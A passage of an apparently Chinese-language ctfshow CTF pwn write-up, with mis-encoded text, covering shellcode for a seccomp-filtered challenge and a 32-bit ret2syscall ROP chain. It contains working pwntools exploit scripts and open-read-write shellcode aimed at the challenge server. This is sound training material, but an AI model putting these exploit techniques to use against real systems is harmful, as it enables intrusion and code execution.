</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">))</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rax, 0x123000; jmp rax&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;sub rsp, 0x30; jmp rsp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/ctfshow_flag&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">orw_shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;do&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_070">PWN_070
</h3><p>é¢˜ç›®ï¼šå¯ä»¥å¼€å§‹ä½ çš„ä¸ªäººç§€äº† flagæ–‡ä»¶ä½ç½®ä¸º/flagã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/250.png"
	width="761"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/250_hu_a3b3de7f37a5aec2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/250_hu_5972e005b5612e1c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="330"
		data-flex-basis="794px"
	
></p>
<p>64ä½ç¨‹åºéƒ¨åˆ†å¼€å¯RELROï¼Œå¼€å¯æ ˆä¿æŠ¤ã€‚å‘Šè¯‰äº†æˆ‘ä»¬flagæ–‡ä»¶ä½ç½®ï¼Œhintä¸­è¿˜æ˜¯è®©æˆ‘ä»¬ç”¨ORWè¯»flagã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/251.png"
	width="956"
	height="350"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/251_hu_9018d94ef92274a8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/251_hu_975528a02a4c9696.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="655px"
	
></p>
<blockquote>
<p>å…·ä½“è§„åˆ™é€»è¾‘ï¼š</p>
<ol>
<li><strong>0000-0001 è¡Œ</strong>ï¼šæ£€æŸ¥ç¨‹åºæ¶æ„ï¼Œä»…å…è®¸ <code>ARCH_X86_64</code>ï¼ˆ64 ä½ x86 æ¶æ„ï¼‰ï¼Œå¦åˆ™ç»ˆæ­¢ç¨‹åºï¼ˆè·³è½¬åˆ° 0007 è¡Œè¿”å› <code>KILL</code>ï¼‰ã€‚</li>
<li><strong>0002 è¡Œ</strong>ï¼šå°†å½“å‰ç³»ç»Ÿè°ƒç”¨å·åŠ è½½åˆ°å¯„å­˜å™¨ <code>A</code>ã€‚</li>
<li><strong>0003-0004 è¡Œ</strong>ï¼šè¿‡æ»¤ â€œéæ ‡å‡†ç³»ç»Ÿè°ƒç”¨â€ï¼ˆç¼–å· &gt;= <code>0x40000000</code> çš„å†…æ ¸ç§æœ‰è°ƒç”¨ï¼‰ï¼Œä»…å…è®¸ç¼–å·ä¸º <code>0xffffffff</code> çš„ç‰¹æ®Šè°ƒç”¨ï¼ˆå®é™…å¾ˆå°‘ç”¨åˆ°ï¼‰ï¼Œå…¶ä»–æ­¤ç±»è°ƒç”¨ä¼šè¢«ç»ˆæ­¢ã€‚</li>
<li><strong>0005 è¡Œ</strong>ï¼šæ˜ç¡®ç¦æ­¢ <code>execve</code> ç³»ç»Ÿè°ƒç”¨ï¼ˆç¼–å· <code>0x3b</code>ï¼Œç”¨äºæ‰§è¡Œæ–°ç¨‹åºï¼‰ï¼Œè§¦å‘æ—¶ä¼šç»ˆæ­¢ç¨‹åºã€‚</li>
<li><strong>0006 è¡Œ</strong>ï¼šå…è®¸æ‰€æœ‰æœªè¢«ä¸Šè¿°è§„åˆ™ç¦æ­¢çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆè¿”å› <code>ALLOW</code>ï¼‰ã€‚</li>
<li><strong>0007 è¡Œ</strong>ï¼šå¯¹è¢«ç¦æ­¢çš„æƒ…å†µï¼Œç›´æ¥ç»ˆæ­¢ç¨‹åºï¼ˆè¿”å› <code>KILL</code>ï¼‰ã€‚</li>
</ol>
</blockquote>
<blockquote class="alert alert-tip">
    <blockquote>
<p>å®Œå…¨æ”¯æŒ**<code>ORW</code>**æ“ä½œï¼å”¯ä¸€è¢«ç¦æ­¢çš„æ˜¯ <code>execve</code>ï¼ˆæ‰§è¡Œæ–°ç¨‹åºï¼‰ï¼Œä½† ORW æ“ä½œä¸ä¾èµ–å®ƒï¼Œå› æ­¤å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚</p>
</blockquote></blockquote>
<p>è·Ÿè¿›åˆ°is_printableå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/252.png"
	width="1030"
	height="289"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/252_hu_e7879f82b69e6c28.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/252_hu_b6086d1ac0acec0d.png 1024w"
	loading="lazy"
	
		alt="is_printable"
	
	
		class="gallery-image" 
		data-flex-grow="356"
		data-flex-basis="855px"
	
></p>
<p>æ¡ä»¶æ˜¯ a1[i] &lt;= 31 || a1[i] == 127ã€‚è¿™æ„å‘³ç€å¦‚æœå­—ç¬¦çš„ ASCII å€¼å°äºç­‰äº 31ï¼Œæˆ–è€…ç­‰äº 127ï¼Œåˆ™è®¤ä¸ºè¯¥å­—ç¬¦ä¸å¯æ‰“å°ã€‚</p>
<blockquote class="alert alert-error">
    <blockquote>
<p>å¯ä»¥åœ¨å¼€å¤´åŠ ä¸Š\x00 \xc0ï¼Œåšè¿‡pwn66ï¼Œæœ‰strlen çš„è¯å¯ä»¥æ‰¾\x00å¼€å¤´çš„shellcodeï¼Œ<code>\x00</code> æ˜¯ ASCII ç ä¸º 0 çš„å­—ç¬¦ï¼ˆä¹Ÿå« <strong>ç©ºå­—ç¬¦</strong>ï¼‰ï¼Œå®ƒåœ¨ C è¯­è¨€ä¸­å”¯ä¸€çš„ç‰¹æ®Šä½œç”¨æ˜¯ <strong>æ ‡è®°å­—ç¬¦ä¸²çš„ç»“æŸ</strong>ã€‚è¿™é‡Œçš„ <code>\x00</code> åªæ˜¯ â€œå‘Šè¯‰ <code>strlen</code> åœæ­¢è®¡ç®—â€ï¼Œæ²¡æœ‰ä»»ä½• â€œèµ‹å€¼â€ æ“ä½œï¼ˆæ—¢ä¸ä¿®æ”¹å¯„å­˜å™¨ï¼Œä¹Ÿä¸ä¿®æ”¹å†…å­˜å€¼ï¼‰ã€‚</p>
</blockquote></blockquote>
<p>è¿™æ³¢ç›´æ¥ä¸ç»™çœ‹mainçš„Cä¼ªä»£ç ï¼Œåªèƒ½çœ‹æ±‡ç¼–è¯­è¨€äº†ã€‚</p>
<p>æˆ‘çš„python3çš„expï¼ˆæ²¡ç”¨åˆ°ORWï¼Œå·§åˆï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28114</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\xc0</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰‹å†™æ±‡ç¼–çš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#coding:utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28114</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">//è°ƒç”¨open()
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0
</span></span></span><span class="line"><span class="cl"><span class="s1">//ç»•è¿‡strlen()æ£€æŸ¥
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r15, 0x67616c66
</span></span></span><span class="line"><span class="cl"><span class="s1">push r15
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 2
</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">//è°ƒç”¨read()
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r14, 3
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, r14
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0xff
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0
</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">//è°ƒç”¨write()
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi,1
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdx, 0xff
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 1
</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å»ºè®®å¤§å®¶åœ¨ä»¥åè¦å¤šå­¦å­¦æ±‡ç¼–è¯­è¨€ï¼Œæœ‰æ—¶å€™æ‰‹æ•²æ˜¯çœŸçš„å®ç”¨ï¼Œå¥½ç†è§£ã€‚</p>
<h3 id="ret2syscall"><strong>ret2syscall</strong>
</h3><p>ret2syscallçš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½¿ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰æŒ‡ä»¤æ¥è·å–ç³»ç»Ÿèµ„æºæˆ–æ‰§è¡Œç‰¹å®šæ“ä½œã€‚ç³»ç»Ÿè°ƒç”¨æ˜¯æ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·ç¨‹åºçš„æ¥å£ï¼Œç”¨äºè¯·æ±‚å†…æ ¸æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œexecveç³»ç»Ÿè°ƒç”¨å¯ä»¥ç”¨æ¥å¯åŠ¨ä¸€ä¸ªæ–°çš„ç¨‹åºï¼ˆå¦‚/bin/shï¼‰ï¼Œä»è€Œè·å–shellã€‚</p>
<p>ret2syscall æ˜¯é€šè¿‡ <strong>æ‹¼æ¥ç¨‹åºä¸­çš„ gadgetï¼ˆæŒ‡ä»¤ç‰‡æ®µï¼‰</strong>ï¼Œæ‰‹åŠ¨è®¾ç½®ç³»ç»Ÿè°ƒç”¨æ‰€éœ€çš„å¯„å­˜å™¨å€¼ï¼Œæœ€ç»ˆè§¦å‘ <code>int 0x80</code>ï¼ˆ32 ä½ Linux ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼‰æ¥æ‰§è¡Œå‘½ä»¤çš„æ”»å‡»æ–¹æ³•ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>1.åœ¨32ä½Linuxç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿè°ƒç”¨é€šè¿‡int 0x80æŒ‡ä»¤è§¦å‘ï¼Œéœ€è¦è®¾ç½®ä»¥ä¸‹å¯„å­˜å™¨ï¼š</p>
<p>eaxï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆä¾‹å¦‚ï¼Œexecveçš„è°ƒç”¨å·ä¸º0xbï¼‰</p>
<p>ebxï¼šç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆä¾‹å¦‚ï¼Œ/bin/shçš„åœ°å€ï¼‰</p>
<p>ecxï¼šç¬¬äºŒä¸ªå‚æ•°ï¼ˆé€šå¸¸ä¸º0ï¼‰</p>
<p>edxï¼šç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆé€šå¸¸ä¸º0ï¼‰</p>
<p>2.åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿè°ƒç”¨é€šè¿‡syscallæŒ‡ä»¤è§¦å‘ï¼Œå¯„å­˜å™¨åˆ†é…æœ‰æ‰€ä¸åŒï¼š</p>
<p>raxï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆä¾‹å¦‚ï¼Œexecveçš„è°ƒç”¨å·ä¸º0x3bï¼‰</p>
<p>rdiï¼šç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>rsiï¼šç¬¬äºŒä¸ªå‚æ•°</p>
<p>rdxï¼šç¬¬ä¸‰ä¸ªå‚æ•°</p>
</blockquote></blockquote>
<h3 id="pwn_071">PWN_071
</h3><p>é¢˜ç›®ï¼š32ä½çš„ret2syscallã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/253.png"
	width="705"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/253_hu_64035e311317f69c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/253_hu_6f12b5aec5e8a08a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="352"
		data-flex-basis="846px"
	
></p>
<p>32ä½å…³é—­æ ˆä¿æŠ¤ä¸PIEã€‚</p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/254.png"
	width="389"
	height="539"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/254_hu_347977e041ff3715.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/254_hu_dfc2988a7dd696b0.png 1024w"
	loading="lazy"
	
		alt="é™æ€ç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="72"
		data-flex-basis="173px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/255.png"
	width="686"
	height="224"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/255_hu_bad0c869421ae208.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/255_hu_63c4f54e6c6a9801.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="735px"
	
></p>
<p>æœ‰æ˜æ˜¾æ ˆæº¢å‡ºæ¼æ´ã€<code>getså‡½æ•°</code>ï¼›é¢˜ç›®æè¿°ä»¥åŠå„å¤„éƒ½æç¤ºäº†è®©ç”¨ret2syscallæ¥è¿›è¡Œæ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾—shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>å¤§è‡´æ€è·¯æ˜¯å…ˆæ ˆæº¢å‡ºå¡«å……ç¼“å†²åŒºï¼Œåˆ©ç”¨gadgetsè°ƒç”¨syscallï¼Œä¹Ÿå°±æ˜¯ä¼ é€’å®ƒçš„è°ƒç”¨å·<code>0xb</code>ï¼Œç”¨raxå¯„å­˜å™¨ä¼ é€’ï¼Œç„¶åè°ƒç”¨execveå‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>,NULL,NULL<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>éœ€è¦ç”¨åˆ°eaxç³»ç»Ÿè°ƒç”¨å‚æ•°ä¼ é€’çš„å¯„å­˜å™¨çš„gadgetï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s2">&#34;pop|ret&#34;</span><span class="p">|</span>grep eax
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/263.png"
	width="1255"
	height="171"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/263_hu_326ee45a78f9d319.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/263_hu_d53916b8141aa5b2.png 1024w"
	loading="lazy"
	
		alt="pop_eax_ret:0x080bb196"
	
	
		class="gallery-image" 
		data-flex-grow="733"
		data-flex-basis="1761px"
	
></p>
<p>execveå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ32ä½æ¶æ„é æ ˆä¼ é€’å‚æ•°ï¼Œæ‰€ä»¥è¦æœ‰å‚æ•°å¯„å­˜å™¨ï¼š<code>ebx</code>ï¼ˆç¬¬ 1 å‚ï¼‰ã€<code>ecx</code>ï¼ˆç¬¬ 2 å‚ï¼‰ã€<code>edx</code>ï¼ˆç¬¬ 3 å‚ï¼‰ï¼Œä¹Ÿå°±æ˜¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --only <span class="s2">&#34;pop|ret&#34;</span><span class="p">|</span>grep ebx
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŒç†ï¼Œint 0x80è°ƒç”¨å·çš„gadgetåœ°å€äº¦æ˜¯å¦‚æ­¤ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/269.png"
	width="1381"
	height="351"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/269_hu_24a61b0f2e8ca09a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/269_hu_e8d841aa604d322b.png 1024w"
	loading="lazy"
	
		alt="int_0x80:0x08049421"
	
	
		class="gallery-image" 
		data-flex-grow="393"
		data-flex-basis="944px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/264.png"
	width="1219"
	height="236"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/264_hu_d49a61625bac63d0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/264_hu_b65b203022f2e0fd.png 1024w"
	loading="lazy"
	
		alt="pop_edx_ecx_ebx_ret:0x0806eb90"
	
	
		class="gallery-image" 
		data-flex-grow="516"
		data-flex-basis="1239px"
	
></p>
<p>/bin/shçš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/265.png"
	width="1333"
	height="465"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/265_hu_4cef6958caeafb9c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/265_hu_d16ab7ba28a6252d.png 1024w"
	loading="lazy"
	
		alt="binsh:0x80BE408"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="688px"
	
></p>
<p>åŒç†int 0x80</p>
<p>æˆ‘ä»¥ä¸ºçš„exp&hellip;&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x80BE408</span>
</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x64</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
